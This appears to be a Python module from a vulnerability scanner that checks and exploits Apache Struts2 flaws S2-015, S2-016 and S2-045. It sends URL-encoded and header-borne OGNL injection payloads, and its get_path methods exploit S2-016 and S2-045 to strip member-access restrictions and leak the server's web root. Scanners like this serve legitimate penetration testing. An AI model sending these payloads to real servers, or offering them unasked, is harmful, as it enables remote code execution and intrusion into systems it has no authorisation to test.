# -*- coding: utf-8 -*-
# @File  : http_struts2.py
# @Date  : 2019/12/19
# @Desc  :
# @license : Copyright(C), funnywolf 
# @Author: funnywolf
# @Contact : github.com/FunnyWolf

import random

from vulscan.common import *

_tiemout = 3


class S2_015(object):
    def __init__(self, url, data=None, headers=None, encoding="UTF-8"):
        if url.endswith(".action"):
            rindex = url.rindex('/')
            self.url = url[:rindex + 1]
        elif url.endswith("/"):
            self.url = url
        else:
            self.url = url + '/'
        self.headers = parse_headers(headers)
        self.encoding = encoding
        self.is_vul = False

    def check(self):
        """检测漏洞是否存在"""
        payload = "%25%7B1%2B1%7D"
        urlpayload = self.url + "{payload}.action".format(payload=payload)
        html = get(urlpayload, self.headers, self.encoding)
        if "2.jsp" in html:
            return True
        else:
            return False


class S2_016(object):
    """S2-016漏洞检测利用类"""
    check_poc = "redirect%3A%24%7B{num1}%2B{num2}%7D"
    web_path = "redirect:$%7B%23a%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23b%3d%23a.getRealPath(%22/%22),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23b),%23matt.getWriter().flush(),%23matt.getWriter().close()%7D"

    def __init__(self, url, data=None, headers=None, encoding="UTF-8"):
        if url.endswith(".action"):
            self.url = url
        else:
            self.url = url + "/index.action"

        self.headers = parse_headers(headers)
        self.encoding = encoding
        self.is_vul = False
        if 'Content-Type' not in self.headers:
            self.headers['Content-Type'] = 'application/x-www-form-urlencoded'

    def check(self):
        """检测漏洞是否存在"""
        num1 = random.randint(10000, 100000)
        num2 = random.randint(10000, 100000)
        poc = self.check_poc.format(num1=num1, num2=num2)
        html = get(self.url + '?' + poc, self.headers, self.encoding)
        nn = str(num1 + num2)
        if html.startswith("ERROR:"):
            return False
        elif nn in html:
            self.is_vul = True
            return True
        return False

    def get_path(self):
        """获取web目录"""
        html = get(self.url + "?" + self.web_path, self.headers, self.encoding)
        if len(html) > 255:
            return html[:255]
        return html


class S2_045(object):
    """S2-045漏洞检测利用类"""
    web_path = r"""%{(#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#outstr.println(#req.getRealPath("/"))).(#outstr.close()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"""

    def __init__(self, url, data=None, headers=None, encoding="UTF-8"):
        self.url = url
        self.headers = parse_headers(headers)
        self.encoding = encoding
        self.data = data
        self.is_vul = False

    def check(self):
        """检测漏洞是否存在"""
        try:
            self.headers[
                'Content-Type'] = '${#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].addHeader("sealgod",1234*1234)}.multipart/form-data'
            req = requests.get(self.url, headers=self.headers, timeout=_tiemout, verify=False)
            try:
                if r"1522756" in req.headers['sealgod']:
                    return True
            except:
                return False
        except Exception as e:
            return False

    def get_path(self):
        """获取web目录"""
        self.headers['Content-Type'] = self.web_path
        html = post(self.url, self.data, self.headers, self.encoding)
        return html


if __name__ == '__main__':
    s = S2_015("http://192.168.8.110:8080")
    print(s.check())
    s = S2_016("http://192.168.8.110:8080")
    print(s.check())
    print(s.get_path())
    s = S2_045("http://192.168.8.110:8080")
    print(s.check())
    print(s.get_path())
